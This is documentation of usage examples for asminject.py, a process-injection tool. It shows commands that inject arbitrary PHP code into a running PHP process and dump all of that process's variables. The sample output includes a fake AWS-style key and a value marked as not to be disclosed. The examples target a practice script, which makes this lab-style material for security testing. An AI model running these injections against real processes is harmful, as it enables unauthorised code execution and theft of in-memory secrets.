# asminject.py examples - PHP
* [Execute arbitrary PHP code inside an existing PHP process](#execute-arbitrary-php-code-inside-an-existing-php-process)
* [Write all variables to standard out](#write-all-variables-to-standard-out)

## Execute arbitrary PHP code inside an existing PHP process

The `execute_php_code.s` payload requires two variables: `phpcode`, which should contain the PHP code that should be executed in the existing PHP process, and `phpname`, which can generally be set to any string.

This payload requires relative offsets for the `php` binary used by the target process.

In one terminal window, launch the practice PHP loop, e.g.:

```
$ php practice/php_loop.php

2022-05-12T13:40:51-0700 - Loop count 0
2022-05-12T13:40:56-0700 - Loop count 1
2022-05-12T13:41:01-0700 - Loop count 2
```

In a separate window, find the target process, and inject the code:

```
# ps auxww | grep php | grep -v grep  
  
root     2037629  [...] php practice/php_loop.php

# python3 ./asminject.py 2037629 execute_php_code.s \
   --relative-offsets-from-binaries --stop-method "slow" \
   --var phpcode "echo \\\"Injected PHP code\\\n\\\";" \
   --var phpname PHP
```

In the first window, note that the loop is interrupted by the injected code, e.g.:

```
2022-05-12T13:41:46-0700 - Loop count 11
Injected PHP code
2022-05-12T13:41:53-0700 - Loop count 12
2022-05-12T13:41:58-0700 - Loop count 13
```

## Write all variables to standard out

Use [the following PHP code, which was based on this Stack Overflow discussion](https://stackoverflow.com/questions/1005021/in-php-is-there-a-way-to-dump-all-variable-names-with-their-corresponding-valu)

```
var_dump(get_defined_vars());
```

e.g.

```
python3 ./asminject.py 249986 execute_php_code.s --arch x86-64 \
   --relative-offsets-from-binaries --stop-method "slow" \
   --var phpcode "var_dump(get_defined_vars());" \
   --var phpname PHP
```


Example output:

```
2022-06-09T16:18:04-0700 - Loop count 8
array(11) {
  ["_GET"]=>
  array(0) {
  }
  ["_POST"]=>
  array(0) {
  }
  ["_COOKIE"]=>
  array(0) {
  }
  ["_FILES"]=>
  array(0) {
  }
  ["argv"]=>
  array(1) {
    [0]=>
    string(21) "practice/php_loop.php"
  }
...omitted for brevity...
["example_global_var_1"]=>
  string(20) "AKIASADF9370235SUAS0"
  ["example_global_var_2"]=>
  string(34) "This value should not be disclosed"
  ["x"]=>
  int(8)
  ["current_timestamp"]=>
  string(24) "2022-06-09T16:18:04-0700"
}
2022-06-09T16:18:13-0700 - Loop count 9
```
